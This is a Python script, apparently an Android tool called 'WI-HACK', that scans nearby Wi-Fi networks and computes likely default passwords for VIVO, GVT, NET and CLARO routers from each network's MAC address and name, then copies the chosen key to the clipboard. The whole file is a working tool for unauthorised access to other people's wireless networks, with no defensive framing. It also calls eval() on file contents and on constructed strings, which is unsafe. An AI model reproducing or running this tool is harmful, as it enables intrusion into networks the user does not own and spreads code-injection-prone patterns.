from tools.utils import edfile, reg, cl
from tools.design import menu_simples, color, color_print
from time import sleep

try:
    import androidhelper
    droid = androidhelper.Android()
except ImportError:

    try:
        import android
        droid = android.Android()
    except ImportError:
        is_droid = False
else:
    is_droid = True


# Obtém informações das redes próximas 
def scan_results():
    if is_droid:
        while True:
            droid.wifiStartScan()
            nets = droid.wifiGetScanResults()

            if len(nets[1]) > 0:
                nets = nets[1]
                break
    else:
        nets = edfile('wifiScanResults.txt')
        nets = eval(nets)

    return nets


# Copia texto
def clip(string):
    droid.setClipboard(string)


# Tenta obter a senha padrão com o mac + nome_da_rede
def getkeys(mac, name):

    passwd = []

    def_eid = [['{mac.upper()} {name}', r'..:(..):(..):(..):..:.. (VIVO(FIBRA)?|GVT)-(\w+)', r'$1$2$3$6'],
               ['{mac.upper()} {name}', r'..:..:(..):..:..:.. (NET|CLARO)_[25]G(\w+)', r'$1$3'],
               ['{mac} {name}', r'..:(..):(..):..:..:(..) VIVO-(\w+)-[25]G', r'$1$2$4$3']]

    for mask in def_eid:
        mask[0] = eval(f"f'{mask[0]}'")
        key = reg(*mask)

        if mask[0] != key:
            passwd += [key]

    return passwd


# Programa Principal
while True:

    list_nets = ['[Sair]', '[Rescan]']
    nets = scan_results()

    for net in nets:
        eid = net['ssid']
        bid = net['bssid']
        sig = net['level']

        list_nets.append(color(f':vm:----------:az:[{sig}]-[{eid}]::'))

    cl()

    color_print(f':n::az:{"-" * 30}[:vd:WI-HACK:az:]::\n')

    op1 = menu_simples(*list_nets,
                       prompt=color('\n:n::ci:>>> ::'),
                       mask=color(':n::vm:[{i}]-:az:{r}::'))

    if op1 == 1:
        color_print(':n::vm:Saindo....::')
        sleep(1)
        break

    elif op1 == 2:
        continue

    else:
        op1 -= 3

    name = nets[op1]['ssid']
    mac = nets[op1]['bssid']

    while True:
        cl()
        keys = getkeys(mac, name)

        if len(keys) == 0:
            color_print(':n::az:Sem senhas disponiveis...::')
            sleep(2.5)
            break

        else:
            keys = ['<<< Voltar'] + keys
            op2 = menu_simples(*keys,
                               prompt=color('\n:n::ci:>>> ::'),
                               mask=color(':n::vm:[{i}]-:az:[{r}]::'))

            op2 -= 1
            if op2 == 0:
                break

            if 'android' in locals() or 'androidhelper' in locals():
                clip(keys[op2])
            else:
                color_print(':vd:Você não esta em um dispositivo android')
                sleep(1)
                color_print(f'Mas a senha que você selecionou foi: {keys[op2]}::')
                sleep(3)
